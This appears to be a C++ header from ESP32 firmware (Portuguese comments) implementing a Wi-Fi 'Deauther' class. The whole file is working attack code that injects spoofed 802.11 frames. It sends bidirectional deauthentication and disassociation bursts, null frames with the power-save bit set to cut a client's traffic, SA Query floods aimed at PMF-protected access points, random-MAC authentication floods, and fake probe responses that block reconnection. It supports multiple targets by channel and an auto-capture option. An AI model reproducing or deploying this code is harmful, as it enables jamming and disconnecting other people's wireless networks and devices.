#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include <algorithm>
#include "../utils/logger.h"
#include "../config.h"

class Deauther {
public:
    static Deauther& get() { static Deauther inst; return inst; }

    bool     running       = false;
    bool     autoCapture   = false;
    uint32_t framesSent    = 0;
    uint8_t  intensity     = 1;  // 0=suave, 1=normal, 2=agressivo

    // Modos especiais
    bool pmfBypass       = false; // SA Query flood para APs com 802.11w
    bool assocFlood      = false; // Inunda tabela de associação do AP
    bool nullFrames      = true;  // Envia null-function com PM=1 (power-save trick)
    bool reconnectBlock  = false; // Probe Response flood falso — impede cliente de reconectar
    char targetSSID[33]  = {};    // SSID do AP alvo (para reconnectBlock)

    uint8_t targetAP[6]     = {0};
    uint8_t targetClient[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t channel         = 1;
    bool    broadcastMode   = true;

    struct Target {
        uint8_t ap[6];
        uint8_t client[6];
        uint8_t channel;
    };
    std::vector<Target> multiTargets;
    bool multiMode = false;

    using LockChannelFn = void(*)(uint8_t ch);
    using ResumeHopFn   = void(*)();
    LockChannelFn fnLockChannel = nullptr;
    ResumeHopFn   fnResumeHop   = nullptr;

    void start(const uint8_t* ap, const uint8_t* client, uint8_t ch, bool autoC = false, const char* ssid = nullptr) {
        memcpy(targetAP, ap, 6);
        if (client) memcpy(targetClient, client, 6);
        else        memset(targetClient, 0xFF, 6);
        channel       = ch;
        broadcastMode = (client == nullptr || memcmp(client, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0);
        autoCapture   = autoC;
        framesSent    = 0;
        _seq          = 0;
        multiMode     = false;
        running       = true;
        if (ssid) { strncpy(targetSSID, ssid, 32); targetSSID[32] = 0; }
        else       targetSSID[0] = 0;
        if (fnLockChannel) fnLockChannel(ch);
        esp_wifi_set_max_tx_power(84); // ~20 dBm
        String mode = broadcastMode ? "BROADCAST" : bssidStr(client);
        LOG.warn("[DEAUTH] " + bssidStr(ap) + " -> " + mode +
                 " ch" + String(ch) +
                 (nullFrames      ? " +NULL"    : "") +
                 (pmfBypass       ? " +PMF"     : "") +
                 (assocFlood      ? " +ASSOC"   : "") +
                 (reconnectBlock  ? " +REBLOCK" : "") +
                 (autoC ? " [AUTO-CAPTURE]" : ""));
    }

    void startMulti(const std::vector<Target>& targets) {
        multiTargets = targets;
        // Agrupa por canal para minimizar troca de canal
        std::stable_sort(multiTargets.begin(), multiTargets.end(),
            [](const Target& a, const Target& b){ return a.channel < b.channel; });
        multiMode  = true;
        framesSent = 0;
        _seq       = 0;
        running    = true;
        esp_wifi_set_max_tx_power(84);
        LOG.warn("[DEAUTH MULTI] " + String(targets.size()) + " alvos (agrupados por canal)");
    }

    void addMultiTarget(const uint8_t* ap, const uint8_t* client, uint8_t ch) {
        Target t;
        memcpy(t.ap, ap, 6); memcpy(t.client, client, 6); t.channel = ch;
        multiTargets.push_back(t);
    }

    void stop() {
        running = false; autoCapture = false; multiMode = false;
        multiTargets.clear();
        if (fnResumeHop) fnResumeHop();
        esp_wifi_set_max_tx_power(78);
        LOG.info("[DEAUTH] Parado. Frames: " + String(framesSent));
    }

    void tick() {
        if (!running) return;
        if (multiMode) _tickMulti();
        else           _tickSingle();
    }

    static String bssidStr(const uint8_t* b) {
        char buf[18];
        snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
                 b[0],b[1],b[2],b[3],b[4],b[5]);
        return buf;
    }

private:
    uint16_t _seq = 0; // sequence number controlado manualmente

    // 16 reason codes — cobre todos os drivers de clientes
    static const uint8_t _reasons[16];

    int _burstSize() const {
        if (intensity == 0) return DEAUTH_BURST_SOFT;
        if (intensity == 2) return DEAUTH_BURST_HARD;
        return DEAUTH_BURST;
    }

    // Próximo seq number (incrementa a cada frame como AP real)
    uint16_t _nextSeq() { _seq = (_seq + 16) & 0xFFF0; return _seq; }

    void _tickSingle() {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        int burst = _burstSize();

        for (int i = 0; i < burst; i++) {
            uint8_t r = _reasons[i % 16];
            // Deauth bidirecional (AP→Cli e Cli→AP)
            _sendDeauth(targetAP, targetClient, r);
            // Disassoc para forçar estado ASSOC=0
            _sendDisassoc(targetAP, targetClient, r);
            framesSent += 2;

            if (!broadcastMode) {
                // Broadcast adicional para desconectar todos do AP
                _sendDeauth(targetAP, bcast, r);
                framesSent++;
            }
        }

        // Null frame trick: faz AP bufferizar tráfego → cliente fica sem dados
        if (nullFrames) {
            _sendNullPowerSave(targetAP, targetClient);
            framesSent++;
        }

        // SA Query flood: contra APs com PMF (802.11w) ativo
        if (pmfBypass) {
            for (int i = 0; i < 8; i++) {
                _sendSAQueryRequest(targetAP, targetClient, (uint16_t)(_seq + i));
                framesSent++;
            }
        }

        // Auth flood: inunda tabela de associação, dificulta reconexão
        if (assocFlood) {
            for (int i = 0; i < 16; i++) {
                _sendAuthFlood(targetAP);
                framesSent++;
            }
        }

        // Reconnect Block: envia probe responses com o SSID real mas BSSID falso
        // Cliente pós-deauth fica tentando se associar ao AP falso em vez do real
        if (reconnectBlock && targetSSID[0] != 0 && !broadcastMode) {
            _sendReconnectBlock(targetClient, targetSSID, channel);
            framesSent++;
        }
    }

    void _tickMulti() {
        if (multiTargets.empty()) return;
        int burst = _burstSize();
        uint8_t lastCh = 0;

        for (auto& t : multiTargets) {
            if (t.channel != lastCh) {
                esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
                lastCh = t.channel;
            }
            int b = max(16, burst / (int)multiTargets.size());
            for (int i = 0; i < b; i++) {
                uint8_t r = _reasons[i % 16];
                _sendDeauth(t.ap, t.client, r);
                _sendDisassoc(t.ap, t.client, r);
                framesSent += 2;
            }
            if (nullFrames) { _sendNullPowerSave(t.ap, t.client); framesSent++; }
            if (assocFlood) {
                for (int i = 0; i < 8; i++) { _sendAuthFlood(t.ap); framesSent++; }
            }
        }
    }

    // --- Frame builders ---

    // Deauth (0xC0) bidirecional
    void _sendDeauth(const uint8_t* ap, const uint8_t* cli, uint8_t reason) {
        _sendMgmt(ap, cli, 0xC0, reason);
    }

    // Disassoc (0xA0) bidirecional
    void _sendDisassoc(const uint8_t* ap, const uint8_t* cli, uint8_t reason) {
        _sendMgmt(ap, cli, 0xA0, reason);
    }

    // AP→Client + Client→AP para o mesmo tipo de frame
    void _sendMgmt(const uint8_t* ap, const uint8_t* cli, uint8_t fc0, uint8_t reason) {
        uint8_t f[26] = {};
        f[0] = fc0; f[1] = 0x00;
        f[2] = 0x3A; f[3] = 0x01; // Duration 314µs
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        f[24] = reason;

        // AP → Client
        memcpy(f+4, cli, 6); memcpy(f+10, ap, 6); memcpy(f+16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);

        // Client → AP (spoof reverso)
        memcpy(f+4, ap, 6); memcpy(f+10, cli, 6); memcpy(f+16, ap, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true);
    }

    // Null data frame com Power Management bit = 1
    // Diz ao AP que o cliente entrou em power-save → AP para de enviar dados → cliente perde conectividade
    void _sendNullPowerSave(const uint8_t* ap, const uint8_t* cli) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if (memcmp(cli, bcast, 6) == 0) return; // não faz sentido em broadcast
        uint8_t f[24] = {};
        f[0] = 0x48;        // Data, subtype=Null function (0x04 << 4 | 0x08)
        f[1] = 0x11;        // ToDS=1, PM=1 (power management bit)
        f[2] = 0x3A; f[3] = 0x01;
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        // ToDS=1: RA=AP, TA=client, DA no BSSID field
        memcpy(f+4, ap, 6);   // RA = AP
        memcpy(f+10, cli, 6); // TA = client (spoofado)
        memcpy(f+16, ap, 6);  // BSSID = AP
        esp_wifi_80211_tx(WIFI_IF_AP, f, 24, true);
    }

    // SA Query Request (Action frame, category=8, action=0)
    // Força clientes PMF a gastar CPU respondendo → pode causar DoS em firmware fraco
    void _sendSAQueryRequest(const uint8_t* ap, const uint8_t* cli, uint16_t txid) {
        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        if (memcmp(cli, bcast, 6) == 0) return;
        uint8_t f[30] = {};
        f[0] = 0xD0; f[1] = 0x00; // Action frame
        f[2] = 0x3A; f[3] = 0x01;
        memcpy(f+4, cli, 6); memcpy(f+10, ap, 6); memcpy(f+16, ap, 6);
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        // Action body: Category=8 (SA Query), Action=0 (Request), TransactionID
        f[24] = 0x08; // SA Query category
        f[25] = 0x00; // Request
        f[26] = txid & 0xFF; f[27] = (txid >> 8) & 0xFF;
        esp_wifi_80211_tx(WIFI_IF_AP, f, 28, true);
    }

    // Probe Response falsa com SSID real mas BSSID aleatório
    // Enviada diretamente ao cliente (unicast) após deauth
    // Efeito: cliente fica "preso" tentando associar ao AP fantasma
    void _sendReconnectBlock(const uint8_t* cli, const char* ssid, uint8_t ch) {
        uint8_t ssidLen = strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;
        // BSSID falso: mesmo FNV-1a do Karma, XOR com seq para variar a cada envio
        uint32_t h = 2166136261u;
        for (int i = 0; i < ssidLen; i++) h = (h ^ (uint8_t)ssid[i]) * 16777619u;
        h ^= (uint32_t)_seq;
        uint8_t fakeBSSID[6] = {0x02, (uint8_t)(h>>24), (uint8_t)(h>>16), (uint8_t)(h>>8), (uint8_t)h, ch};

        uint8_t f[128] = {};
        uint8_t off = 0;
        f[off++] = 0x50; f[off++] = 0x00; // Probe Response
        f[off++] = 0x00; f[off++] = 0x00;
        memcpy(f + off, cli, 6);       off += 6; // DA = cliente
        memcpy(f + off, fakeBSSID, 6); off += 6; // SA = AP falso
        memcpy(f + off, fakeBSSID, 6); off += 6; // BSSID = AP falso
        f[off++] = 0x00; f[off++] = 0x00;
        uint64_t ts = esp_timer_get_time();
        memcpy(f + off, &ts, 8); off += 8;
        f[off++] = 0x64; f[off++] = 0x00; // beacon interval
        f[off++] = 0x31; f[off++] = 0x04; // capabilities
        f[off++] = 0x00; f[off++] = ssidLen;
        memcpy(f + off, ssid, ssidLen); off += ssidLen;
        f[off++] = 0x01; f[off++] = 0x08;
        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
        memcpy(f + off, rates, 8); off += 8;
        f[off++] = 0x03; f[off++] = 0x01; f[off++] = ch;
        esp_wifi_80211_tx(WIFI_IF_AP, f, off, false);
    }

    // Auth Request de MAC aleatório → enche tabela de autenticação do AP
    // Clientes legítimos deautenticados não conseguem se re-autenticar
    void _sendAuthFlood(const uint8_t* ap) {
        uint8_t f[30] = {};
        f[0] = 0xB0; f[1] = 0x00; // Authentication
        f[2] = 0x3A; f[3] = 0x01;
        // MAC fonte aleatório (bit U/L = 1 para MAC local)
        uint8_t fake[6];
        esp_fill_random(fake, 6);
        fake[0] |= 0x02; fake[0] &= 0xFE; // locally administered, unicast
        memcpy(f+4, ap, 6);    // DA = AP
        memcpy(f+10, fake, 6); // SA = MAC aleatório
        memcpy(f+16, ap, 6);   // BSSID = AP
        uint16_t sq = _nextSeq();
        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
        // Auth body: Algorithm=Open(0), Seq=1, Status=0
        f[24] = 0x00; f[25] = 0x00; // Open System
        f[26] = 0x01; f[27] = 0x00; // Auth seq 1
        f[28] = 0x00; f[29] = 0x00; // Status = Success
        esp_wifi_80211_tx(WIFI_IF_AP, f, 30, true);
    }
};

// 16 reason codes IEEE 802.11-2020
inline const uint8_t Deauther::_reasons[16] = {
    0x01, // Unspecified
    0x02, // Previous auth no longer valid
    0x03, // Deauth: STA leaving
    0x04, // Inactivity
    0x05, // AP can't handle all STAs
    0x06, // Class 2 frame from non-auth STA
    0x07, // Class 3 frame from non-assoc STA
    0x08, // STA leaving BSS
    0x09, // STA not auth with this BSS
    0x0E, // MIC failure
    0x0F, // 4-Way Handshake timeout
    0x10, // Group Key Handshake timeout
    0x11, // IE in reassoc differs
    0x12, // Invalid group cipher
    0x13, // Invalid pairwise cipher
    0x14, // Invalid AKMP
};
